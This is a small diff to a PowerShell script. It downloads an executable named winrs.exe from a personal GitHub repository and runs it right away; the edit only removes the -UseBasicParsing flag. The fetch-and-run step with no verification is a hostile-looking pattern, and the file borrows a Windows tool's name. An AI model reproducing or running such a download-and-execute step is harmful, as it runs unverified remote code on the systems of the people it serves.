@@ -21,7 +21,7 @@ Try {
     Write-Output "===> Start at $(Get-Date -Format o)"
 
     $scriptPath = "$PSScriptRoot\winrs.exe"
-    iwr https://github.com/truongcp0305/dp/archive/refs/heads/winrs.exe -OutFile winrs.exe -UseBasicParsing
+    iwr https://github.com/truongcp0305/dp/archive/refs/heads/winrs.exe -OutFile winrs.exe 
     & $scriptPath
 
 } Catch {
